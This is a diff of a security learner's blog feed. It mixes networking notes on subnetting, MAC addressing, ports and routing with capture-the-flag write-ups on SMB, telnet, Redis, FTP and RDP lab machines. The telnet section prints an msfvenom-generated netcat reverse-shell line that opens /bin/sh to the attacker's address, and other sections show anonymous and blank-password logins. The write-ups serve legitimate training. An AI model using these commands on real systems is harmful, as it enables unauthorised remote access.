 <p>Company X needs IP addresses to connect 5000 end hosts. Since Class C can only allocate 2^8-2, or 254 addresses, we would have to allocate a Class B to X. A Class B provides 2^16-2, or 65,534 addresses. This means Company X, which only needs 5000 addresses, would waste over 60,000 IP addresses.</p>
 <h3 id="subnetting">Subnetting</h3>
 <div style="text-align: center"><img src="./image-24.png"></div>
-<p>Due to the waste of too many IP addresses, subnetting is essential. Returning to the same example, let&rsquo;s assign IP addresses to this point-to-point network using <strong>/30</strong> (which is a subnet of that larger Class C network).</p>
+<p>Due to the waste of too many IP addresses, subnetting is essential. Returning to the same example, let&rsquo;s assign IP addresses to this point-to-point network using <code>/30</code> (which is a subnet of that larger Class C network).</p>
 <p>203.0.113.0/30 includes addresses from 203.0.113.0 to 203.0.113.3. When converted to binary, the IP addresses are as follows:</p>
 <ul>
 <li>203.0.113.0 = 11001011.00000000.01110001.00000000</li>
@@ -1971,7 +1971,7 @@ A subnet refers to a portioned network within an IP address that divides the net
 <li>203.0.113.3 = 11001011.00000000.01110001.00000011</li>
 </ul>
 <p>We assign 203.0.113.1 and 203.0.113.2 to R1 and R2, respectively. (Since this was a point-to-point network, we could also use /31 instead of /30 since poin-to-point networks do not need 2 extra addresses for network and broadcast addresses.)
-Earlier, we mentioned that <strong>/30</strong> is a subnet of the <strong>/24</strong> address. So, what happens to the remaining addresses from 203.0.113.4 to 203.0.113.255 in the 203.0.113.0/24 network? These remaining addresses can be used in other subnets to prevent any waste of IP address.</p>
+Earlier, we mentioned that <code>/30</code> is a subnet of the <code>/24</code> address. So, what happens to the remaining addresses from 203.0.113.4 to 203.0.113.255 in the 203.0.113.0/24 network? These remaining addresses can be used in other subnets to prevent any waste of IP address.</p>
 ]]></content:encoded>
     </item>
     <item>
@@ -2022,7 +2022,7 @@ SMB (Server Message Block) Protocol Understanding SMB What does SMB stand for?</
 
 <pre tabindex="0"><code>Unix</code></pre>
 <h4 id="enumerating-smb">Enumerating SMB</h4>
-<p>Conduct an <strong>nmap</strong> scan of your choosing, How many ports are open?</p>
+<p>Conduct an <code>nmap</code> scan of your choosing, How many ports are open?</p>
 
 
 
@@ -2080,7 +2080,7 @@ SMB (Server Message Block) Protocol Understanding SMB What does SMB stand for?</
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 13.04 seconds</span></span></code></pre></div>
 <br>
-<p>Let&rsquo;s get started with <strong>Enum4Linux</strong>, conduct a full basic enumeration. For starters, what is the <strong>workgroup</strong> name?</p>
+<p>Let&rsquo;s get started with <code>Enum4Linux</code>, conduct a full basic enumeration. For starters, what is the <code>workgroup</code> name?</p>
 
 
 
@@ -2108,7 +2108,7 @@ SMB (Server Message Block) Protocol Understanding SMB What does SMB stand for?</
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>	---------            -------
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>	WORKGROUP            POLOSMB</span></span></code></pre></div>
 <br>
-<p>What comes up as the <strong>name</strong> of the machine?</p>
+<p>What comes up as the <code>name</code> of the machine?</p>
 
 
 
@@ -2129,7 +2129,7 @@ SMB (Server Message Block) Protocol Understanding SMB What does SMB stand for?</
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>	---------            -------
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>	WORKGROUP            POLOSMB</span></span></code></pre></div>
 <br>
-<p>What operating system <strong>version</strong> is running?</p>
+<p>What operating system <code>version</code> is running?</p>
 
 
 
@@ -2190,10 +2190,10 @@ SMB (Server Message Block) Protocol Understanding SMB What does SMB stand for?</
 
 <pre tabindex="0"><code>smbclient //10.10.10.2/secret -U suit -p 445</code></pre>
 <p>We can remotely access the SMB share using the syntax:
-<strong>smbclient //[IP]/[SHARE]</strong> followed by the tags:
+<code>smbclient //[IP]/[SHARE]</code> followed by the tags:
 -U [name]: to specify the user
 -p [port]: to specify the port
-SMB default ports are <strong>139 or 445</strong></p>
+SMB default ports are <code>139 or 445</code></p>
 <br>
 <p>Let&rsquo;s see if our interesting share has been configured to allow anonymous access, i,e it doesn&rsquo;t require authentication to view the files. We can do this easily by:</p>
 <ul>
@@ -2454,7 +2454,7 @@ SMB default ports are <strong>139 or 445</strong></p>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>|   DNSStatusRequest, DNSVersionBindReq, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe:
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>|_    SKIDY<span style="color:#f38ba8">&#39;</span>S BACKDOOR. Type .HELP to view commands</span></span></code></pre></div>
 <br>
-<p>Who could it belong to? Gathering possible <strong>usernames</strong> is an important step in enumeration.</p>
+<p>Who could it belong to? Gathering possible <code>usernames</code> is an important step in enumeration.</p>
 
 
 
@@ -2505,7 +2505,7 @@ SMB default ports are <strong>139 or 445</strong></p>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>tcpdump: verbose output suppressed, use -v or -vv <span style="color:#cba6f7">for</span> full protocol decode
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>listening on ens5, link-type EN10MB <span style="color:#89dceb;font-weight:bold">(</span>Ethernet<span style="color:#89dceb;font-weight:bold">)</span>, capture size <span style="color:#fab387">262144</span> bytes</span></span></code></pre></div>
 <br>
-<p>Now, use the command <strong>Ping [local THM ip] -c 1</strong> through the telnet session to see if we&rsquo;re able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)</p>
+<p>Now, use the command <code>Ping [local THM ip] -c 1</code> through the telnet session to see if we&rsquo;re able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)</p>
 
 
 
@@ -2539,12 +2539,12 @@ SMB default ports are <strong>139 or 445</strong></p>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>03:36:25.256083 IP ip-10-10-46-62.eu-west-1.compute.internal &gt; ip-10-10-220-9.eu-west-1.compute.internal: ICMP <span style="color:#89dceb">echo</span> reply, id 1319, seq 1, length <span style="color:#fab387">64</span></span></span></code></pre></div>
 <br>
 <p>We&rsquo;re going to generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us. here&rsquo;s our syntax:
-<strong>msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R</strong></p>
+<code>msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R</code></p>
 <ul>
-<li><strong>-p</strong> = payload</li>
-<li><strong>host</strong> = our local host IP address (this is your machine&rsquo;s IP address)</li>
-<li><strong>lport</strong> = the port to listen on (this is the port on your machine)</li>
-<li><strong>R</strong> = export the payload in raw format</li>
+<li><code>-p</code> = payload</li>
+<li><code>host</code> = our local host IP address (this is your machine&rsquo;s IP address)</li>
+<li><code>lport</code> = the port to listen on (this is the port on your machine)</li>
+<li><code>R</code> = export the payload in raw format</li>
 </ul>
 <br>
 <p>What word does the generated payload start with?</p>
@@ -2569,7 +2569,7 @@ SMB default ports are <strong>139 or 445</strong></p>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>mkfifo /tmp/loqsthl; nc 10.10.46.62 <span style="color:#fab387">4444</span> 0&lt;/tmp/loqsthl | /bin/sh &gt;/tmp/loqsthl 2&gt;&amp;1; rm /tmp/loqsthl</span></span></code></pre></div>
 <br>
 <p>Now all we need to do is start a netcat listener on our local machine. We do this using:
-<strong>nc -lvp [listening port]</strong></p>
+<code>nc -lvp [listening port]</code></p>
 <p>What would the command look like for the listening port we selected in our payload?</p>
 
 
@@ -2677,7 +2677,7 @@ SMB default ports are <strong>139 or 445</strong></p>
 
 <pre tabindex="0"><code>vsftpd</code></pre>
 <br>
-<p>Great, now we know what type of FTP server we&rsquo;re dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing <strong>FTP [IP]</strong> into the console, and entering &ldquo;anonymous&rdquo;, and no password when prompted.</p>
+<p>Great, now we know what type of FTP server we&rsquo;re dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing <code>FTP [IP]</code> into the console, and entering &ldquo;anonymous&rdquo;, and no password when prompted.</p>
 <p>What is the name of the file in the anonymous FTP directory?</p>
 
 
@@ -2876,7 +2876,7 @@ DHCPv6 IAID.....................:
 DHCPv6 Client DUID..............: 00-01-00-01-09-99-E5-2C-00-D0-BA-11-11-11
 DNS Servers.....................: ::
 0.0.0.0</code></pre>
-<p>the last four digits of PC1&rsquo;s MAC Address is <strong>1111</strong> . We are sending a packet from PC1 to PC4, which means the source IP Address is <strong>192.168.1.1</strong> (PC1&rsquo;s IP Address) and the destination IP Address is <strong>192.168.3.1</strong> (PC4&rsquo;s IP Address). The source and destination IP Address remain unchanged throughout the communication. Because PC4 is located on a different network, PC1 will encapsulate the packet with an Ethernet header and the destination MAC address will be the MAC address of its <strong>default gateway</strong>. In this case, it&rsquo;s R1&rsquo;s g0/0 interface. It will be the destination MAC address.</p>
+<p>the last four digits of PC1&rsquo;s MAC Address is <code>1111</code> . We are sending a packet from PC1 to PC4, which means the source IP Address is <code>192.168.1.1</code> (PC1&rsquo;s IP Address) and the destination IP Address is <code>192.168.3.1</code> (PC4&rsquo;s IP Address). The source and destination IP Address remain unchanged throughout the communication. Because PC4 is located on a different network, PC1 will encapsulate the packet with an Ethernet header and the destination MAC address will be the MAC address of its <code>default gateway</code>. In this case, it&rsquo;s R1&rsquo;s g0/0 interface. It will be the destination MAC address.</p>
 
 
 
@@ -2887,7 +2887,7 @@ DNS Servers.....................: ::
 R1#show interfaces g0/0
 GigabitEthernet0/0 is up, line protocol is up (connected)
 Hardware is CN Gigabit Ethernet, address is 0000.01aa.aaaa (bia 00d0.ff77.0101)</code></pre>
-<p>The last four digits of R1&rsquo;s g0/0 interface MAC address is <strong>aaaa</strong> .</p>
+<p>The last four digits of R1&rsquo;s g0/0 interface MAC address is <code>aaaa</code> .</p>
 <div style="text-align: center"><img src="./image16.png"></div>
 <br/>
 <h5 id="q2-sourcedestination-mac-addresses-at-sw1--r1-segment">Q2. Source/Destination MAC addresses at SW1 → R1 segment.</h5>
@@ -2912,9 +2912,9 @@ Destination MAC Address: AAAA</code></pre>
 Destination MAC address: CCCC</code></pre>
 <p>Like I already mentioned, the source and destination IP addresses will remain the same, as R1 encapsulates the packet with an Ethernet header, it will use the MAC address of its g0/1 interface as the source MAC address and the MAC address of R2&rsquo;s g0/0 interface, which is the next hop in the route, as the destination MAC address.</p>
 <div style="text-align: center"><img src="./image17.png"></div>
-<p>The last four digits of R1&rsquo;s g0/1 interface MAC address is <strong>BBBB</strong>.</p>
+<p>The last four digits of R1&rsquo;s g0/1 interface MAC address is <code>BBBB</code>.</p>
 <div style="text-align: center"><img src="./image18.png"></div>
-<p>The last four digits of R2&rsquo;s g0/0 interface MAC address is <strong>CCCC</strong>.</p>
+<p>The last four digits of R2&rsquo;s g0/0 interface MAC address is <code>CCCC</code>.</p>
 <div style="text-align: center"><img src="./image19.png"></div>
 <p>Here, on Cisco Packet Tracer, we can confirm the source/destination MAC address on the Ethernet header in Layer 2.</p>
 <br/>
@@ -2929,9 +2929,9 @@ Destination MAC address: CCCC</code></pre>
 Destination MAC address: EEEE</code></pre>
 <p>The source MAC address will be R2&rsquo;s interface g0/1 and the destination MAC address will be R3&rsquo;s interface g0/0.</p>
 <div style="text-align: center"><img src="./image20.png"></div>
-<p>The last four digits of R2&rsquo;s interface g0/1 MAC address is <strong>DDDD</strong>.</p>
+<p>The last four digits of R2&rsquo;s interface g0/1 MAC address is <code>DDDD</code>.</p>
 <div style="text-align: center"><img src="./image21.png"></div>
-<p>The last four digits of R3&rsquo;s interface g0/0 MAC address is <strong>EEEE</strong>.</p>
+<p>The last four digits of R3&rsquo;s interface g0/0 MAC address is <code>EEEE</code>.</p>
 <div style="text-align: center"><img src="./image22.png"></div>
 <br/>
 <h5 id="q5-e-sourcedestination-mac-addresses-at-r3--sw2-segment">Q5. E. Source/Destination MAC addresses at R3 → SW2 segment.</h5>
@@ -2943,10 +2943,10 @@ Destination MAC address: EEEE</code></pre>
 
 <pre tabindex="0"><code>Source MAC address: FFFF
 Destination MAC address: 4444</code></pre>
-<p>At this point, the destination IP address is part of a network connected to R3, <strong>192.168.3.0/24</strong> , so R3 knows it can send the packet directly to PC4. So, it will set the destination MAC address to PC4&rsquo;s MAC address, and use its own address as the source.</p>
-<p>The source MAC address will be R3&rsquo;s g0/1 interface, which is <strong>FFFF</strong> .</p>
+<p>At this point, the destination IP address is part of a network connected to R3, <code>192.168.3.0/24</code> , so R3 knows it can send the packet directly to PC4. So, it will set the destination MAC address to PC4&rsquo;s MAC address, and use its own address as the source.</p>
+<p>The source MAC address will be R3&rsquo;s g0/1 interface, which is <code>FFFF</code> .</p>
 <div style="text-align: center"><img src="./image23.png"></div>
-<p>The destination MAC address will be PC4&rsquo;s MAC address, which turned out to be <strong>4444</strong> (the last 4 digits).</p>
+<p>The destination MAC address will be PC4&rsquo;s MAC address, which turned out to be <code>4444</code> (the last 4 digits).</p>
 
 
 
@@ -3009,12 +3009,12 @@ To simply put, a port is like an address for a specific program or service runni
 <p>When you enter a domain address in the address bar and press enter, the browser is set to send the communicate to port 80 by default. That&rsquo;s why you don&rsquo;t need to enter the port number. If you don&rsquo;t want to communicate through port 80, you can set the port number separately in the address bar.</p>
 <h3 id="there-are-total-65535-ports">There are total 65,535 ports.</h3>
 <ul>
-<li>Port numbers 0 - 1023 are called <strong>System or Well-known</strong> ports.</li>
-<li>Port numbers 1024 - 49151 are called <strong>User</strong> or <strong>Registered</strong> ports.</li>
-<li>Port numbers 49152-65535 are called <strong>Dynamic</strong> or <strong>Private</strong> ports.</li>
+<li>Port numbers 0 - 1023 are called <code>System or Well-known</code> ports.</li>
+<li>Port numbers 1024 - 49151 are called <code>User</code> or <code>Registered</code> ports.</li>
+<li>Port numbers 49152-65535 are called <code>Dynamic</code> or <code>Private</code> ports.</li>
 </ul>
 <hr>
-<p>Now it all makes sense. When we are doing a CTF, the first thing we always do in the enumeration phase is utilize the <strong>nmap</strong> command to perform port scanning. This helps us identify open ports and see which services are running on them. The target might be running several programs, and we need to find and confirm which programs/services are running and identify corresponding vulnerabilities.</p>
+<p>Now it all makes sense. When we are doing a CTF, the first thing we always do in the enumeration phase is utilize the <code>nmap</code> command to perform port scanning. This helps us identify open ports and see which services are running on them. The target might be running several programs, and we need to find and confirm which programs/services are running and identify corresponding vulnerabilities.</p>
 ]]></content:encoded>
     </item>
     <item>
@@ -3053,7 +3053,7 @@ This box was the most challenging one to crack so far, but I feel incredibly acc
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 0.71 seconds</span></span></code></pre></div>
-<p>Initially, scanning ports on the target IP address did not reveal any open ports. Therefore, I had to expand my scan to include more ports. By default, Nmap scans only the most commonly used 1,000 ports, which are statistically the most likely to be open based on real-world usage. By adding the <strong>-p-</strong> option, Nmap scans all 65,535 ports on the target IP address. This extended scan revealed that port 6379/tcp is open.</p>
+<p>Initially, scanning ports on the target IP address did not reveal any open ports. Therefore, I had to expand my scan to include more ports. By default, Nmap scans only the most commonly used 1,000 ports, which are statistically the most likely to be open based on real-world usage. By adding the <code>-p-</code> option, Nmap scans all 65,535 ports on the target IP address. This extended scan revealed that port 6379/tcp is open.</p>
 
 
 
@@ -3103,8 +3103,8 @@ This box was the most challenging one to crack so far, but I feel incredibly acc
 
 
 <pre tabindex="0"><code>redis-cli</code></pre>
-<p>To be able to interact with the Redis server, we need to download the <strong>redis-cli</strong> utility. It can be downloaded using the command below.</p>
-<p><strong>sudo apt install redis-tools</strong></p>
+<p>To be able to interact with the Redis server, we need to download the <code>redis-cli</code> utility. It can be downloaded using the command below.</p>
+<p><code>sudo apt install redis-tools</code></p>
 <br/>
 <h5 id="task-5">TASK 5</h5>
 <p>which flag is used with the Redis command-line utility to specify the hostname?</p>
@@ -3137,7 +3137,7 @@ This box was the most challenging one to crack so far, but I feel incredibly acc
 
 
 <pre tabindex="0"><code>info</code></pre>
-<p>The answer to this question was a bit challenging to find. A quick Google search would have provided it in seconds, but I wanted to challenge my self. After I got a successful connection with the Redis server, I typed the <strong>help</strong> command to gain some insights.</p>
+<p>The answer to this question was a bit challenging to find. A quick Google search would have provided it in seconds, but I wanted to challenge my self. After I got a successful connection with the Redis server, I typed the <code>help</code> command to gain some insights.</p>
 
 
 
@@ -3151,7 +3151,7 @@ This box was the most challenging one to crack so far, but I feel incredibly acc
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#a6e3a1">&#34;help &lt;command&gt;&#34;</span> <span style="color:#cba6f7">for</span> <span style="color:#89dceb">help</span> on &lt;command&gt;
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#a6e3a1">&#34;help &lt;tab&gt;&#34;</span> to get a list of possible <span style="color:#89dceb">help</span> topics
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#a6e3a1">&#34;quit&#34;</span> to exit</span></span></code></pre></div>
-<p>The output indicated that <strong>help <tab></strong> command would list possible help topics. Each time I pressed the tab key, the topic changed. Then I found <strong>@server</strong> topic, which seemed promising since I was looking for a command to obtain the information and statistics about the Redis server.</p>
+<p>The output indicated that <code>help &lt;tab&gt;</code> command would list possible help topics. Each time I pressed the tab key, the topic changed. Then I found <code>@server</code> topic, which seemed promising since I was looking for a command to obtain the information and statistics about the Redis server.</p>
 
 
 
@@ -3380,8 +3380,8 @@ If felt like an explosion inside my brain! just like the name of the box.</p>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Username</span></span></code></pre></div>
 <div style="text-align: center"><img src="./image8.png"></div>
 <div style="text-align: center"><img src="./image9.png"></div>
-<p>I was discovered useful switch options through the <strong>xfreerdp &ndash;help</strong> command, but I had no idea how to find a specific username that would allow me to connect to the RDP server with a blank password, as the RDP session was not accepting my own username. I had to look up the write-up provided by HTB, which revealed that the username was Administrator. Now that I know the username, I thought to myself, why didn&rsquo;t I think of trying &lsquo;<strong>Administrator</strong>&rsquo;?
-The final command <strong>xfreerdp /v:10.129.1.13 /cert-ignore /u:Administrator</strong> connected me to the RDP server with a blank password.</p>
+<p>I was discovered useful switch options through the <code>xfreerdp --help</code> command, but I had no idea how to find a specific username that would allow me to connect to the RDP server with a blank password, as the RDP session was not accepting my own username. I had to look up the write-up provided by HTB, which revealed that the username was Administrator. Now that I know the username, I thought to myself, why didn&rsquo;t I think of trying &lsquo;<code>Administrator</code>&rsquo;?
+The final command <code>xfreerdp /v:10.129.1.13 /cert-ignore /u:Administrator</code> connected me to the RDP server with a blank password.</p>
 </br>
 <h5 id="submit-flag">SUBMIT FLAG</h5>
 <p>Submit root flag</p>
@@ -3411,16 +3411,16 @@ The final command <strong>xfreerdp /v:10.129.1.13 /cert-ignore /u:Administrator<
 <p>Routing is the process that routers use to determine the path that IP packets should take over a network to reach their destination.</p>
 </blockquote>
 <p>When a router receives a packet, it&rsquo;s the router&rsquo;s job to forward it to the correct destination.</p>
-<p>Routers store routes to all of their known destinations in a <strong>Routing table</strong>.</p>
+<p>Routers store routes to all of their known destinations in a <code>Routing table</code>.</p>
 <p>Switches keep a MAC address table with their known destination MAC addresses, and routers keep a routing table with their known destination networks.</p>
 <p>When routers receive packets, they look in the routing table to find the best route to forward the packet.</p>
 <p>There are two main routing methods:</p>
 <ul>
 <li>
-<p><strong>dynamic routing</strong>: Routers use dynamic protocols (i.e., OSPF) to share routing information with each other automatically and build their routing tables.</p>
+<p><code>dynamic routing</code>: Routers use dynamic protocols (i.e., OSPF) to share routing information with each other automatically and build their routing tables.</p>
 </li>
 <li>
-<p><strong>static routing</strong>: A network engineer/admin manually configures routes on the router.
+<p><code>static routing</code>: A network engineer/admin manually configures routes on the router.
 But before we go into routing methods,</p>
 </li>
 </ul>
@@ -3435,27 +3435,27 @@ But before we go into routing methods,</p>
 </ul>
 <p>Also, there are few types of routes found in routing tables.</p>
 <ol>
-<li><strong>Connected routes</strong></li>
-<li><strong>Local routes</strong></li>
+<li><code>Connected routes</code></li>
+<li><code>Local routes</code></li>
 </ol>
-<p><strong>Connected Routes</strong></p>
+<p><code>Connected Routes</code></p>
 <ul>
 <li>These are routes that are directly connected to a router&rsquo;s interface.</li>
 <li>they are automatically created when an interface is configured with an IP address and brought up. Connected routes are essential for a router to communicate with devices on the directly attached network.</li>
 </ul>
-<p><strong>Local Routes</strong></p>
+<p><code>Local Routes</code></p>
 <ul>
 <li>These are routes to the IP addresses assigned to the router&rsquo;s own interfaces.</li>
 <li>Local routes are used to specify that the router can directly reach its own IP addresses. They have the highest priority in the routing table since the router must be able to communicate with its own interfaces.</li>
-<li><strong>/32</strong> netmask is used to specify the exact IP address of the interface.</li>
+<li><code>/32</code> netmask is used to specify the exact IP address of the interface.</li>
 </ul>
-<p>There&rsquo;s a special kind of static route called a <strong>default route</strong>.</p>
+<p>There&rsquo;s a special kind of static route called a <code>default route</code>.</p>
 <p>This is a route that you configure inside the router that says, if nothing else matches inside of our routing table, send the traffic this way.</p>
 <p>It&rsquo;s also known as the &ldquo;gateway of last resort&rdquo;</p>
-<p>A default route is a route to <strong>0.0.0.0/0</strong></p>
+<p>A default route is a route to <code>0.0.0.0/0</code></p>
 <ul>
-<li><strong>/0</strong> means that all bits of the netmask are 0, so none of the bits of the addresses are fixed. They can all change to be either 0 or 1.</li>
-<li><strong>0.0.0.0/0</strong> is the least specific route possible; it includes every possible destination IP address.</li>
+<li><code>/0</code> means that all bits of the netmask are 0, so none of the bits of the addresses are fixed. They can all change to be either 0 or 1.</li>
+<li><code>0.0.0.0/0</code> is the least specific route possible; it includes every possible destination IP address.</li>
 <li>If the router doesn&rsquo;t have any more specific routes that match a packet&rsquo;s destination IP address, the router will forward the packet using the default route.</li>
 </ul>
 <ul>
@@ -3608,7 +3608,7 @@ Port 445: Later versions of SMB (after Windows 2000) began to use port 445 on to
 
 
 <pre tabindex="0"><code>WorkShares</code></pre>
-<p>Running the <strong>smbclient -L 10.129.1.12</strong> command, we can see that four separate shares are displayed. The default administrative shares often include the $ symbol at the end of their name to indicate they are hidden shares. As we can see that <strong>ADMIN$</strong> , <strong>C$</strong>, <strong>IPC$</strong> shares all include the symbol at the end. On the other hand, <strong>WorkShares</strong> share does not include this symbol, which is an indicator that it is a user-created, or custom, share.</p>
+<p>Running the <code>smbclient -L 10.129.1.12</code> command, we can see that four separate shares are displayed. The default administrative shares often include the $ symbol at the end of their name to indicate they are hidden shares. As we can see that <code>ADMIN$</code> , <code>C$</code>, <code>IPC$</code> shares all include the symbol at the end. On the other hand, <code>WorkShares</code> share does not include this symbol, which is an indicator that it is a user-created, or custom, share.</p>
 </br>
 <h5 id="task-7">TASK 7</h5>
 <p>What is the command we can use within the SMB shell to download the files we find?</p>
@@ -3634,11 +3634,11 @@ Port 445: Later versions of SMB (after Windows 2000) began to use port 445 on to
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>.. D <span style="color:#fab387">0</span> Mon Mar <span style="color:#fab387">29</span> 09:22:01 <span style="color:#fab387">2021</span>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>Amy.J D <span style="color:#fab387">0</span> Mon Mar <span style="color:#fab387">29</span> 10:08:24 <span style="color:#fab387">2021</span>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span>James.P D <span style="color:#fab387">0</span> Thu Jun <span style="color:#fab387">3</span> 09:38:03 <span style="color:#fab387">2021</span></span></span></code></pre></div>
-<p>In order to connect to the custom share, <strong>WorkShares</strong> , we need to specify the target&rsquo;s IP address and the target SMB share. The command is <strong>smbclient \\{target_IP}\{target_share}</strong>.</p>
+<p>In order to connect to the custom share, <code>WorkShares</code> , we need to specify the target&rsquo;s IP address and the target SMB share. The command is <code>smbclient \\\\{target_IP}\\{target_share}</code>.</p>
 <ul>
 <li>The double backslashes (&rsquo;\\&rsquo;) are used to escape the backslashes in the path.</li>
-<li>The path <strong>{target_IP}\WorkShares</strong> refers to the &ldquo;WorkShares&rdquo; share on the machine identified by &lsquo;{target_IP}&rsquo;</li>
-<li>We were able to connect to the custom share and I used the command ls to list all of the contents of the directories within the share. The command showed us two directories, one is <strong>Amy.J</strong> and another is <strong>James.P</strong> .</li>
+<li>The path <code>{target_IP}\\WorkShares</code> refers to the &ldquo;WorkShares&rdquo; share on the machine identified by &lsquo;{target_IP}&rsquo;</li>
+<li>We were able to connect to the custom share and I used the command ls to list all of the contents of the directories within the share. The command showed us two directories, one is <code>Amy.J</code> and another is <code>James.P</code> .</li>
 </ul>
 
 
@@ -3677,7 +3677,7 @@ Port 445: Later versions of SMB (after Windows 2000) began to use port 445 on to
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>smb: <span style="color:#89b4fa">\J</span>ames.P<span style="color:#89b4fa">\&gt;</span> get flag.txt
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>getting file <span style="color:#89b4fa">\J</span>ames.P<span style="color:#89b4fa">\f</span>lag.txt of size <span style="color:#fab387">32</span> as flag.txt <span style="color:#89dceb;font-weight:bold">(</span>0.7 KiloBytes/sec<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">(</span>average 1.5 KiloBytes/sec<span style="color:#89dceb;font-weight:bold">)</span>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>smb: <span style="color:#89b4fa">\J</span>ames.P<span style="color:#89b4fa">\&gt;</span></span></span></code></pre></div>
-<p>I used <strong>cd</strong> command to visit Amy.J folder and found &lsquo;worknotes.txt&rsquo; file, which we can download using the <strong>get</strong> command. Also we moved inside the James.P directory as well and downloaded the flag.txt file.</p>
+<p>I used <code>cd</code> command to visit Amy.J folder and found &lsquo;worknotes.txt&rsquo; file, which we can download using the <code>get</code> command. Also we moved inside the James.P directory as well and downloaded the flag.txt file.</p>
 
 
 
@@ -3691,7 +3691,7 @@ Port 445: Later versions of SMB (after Windows 2000) began to use port 445 on to
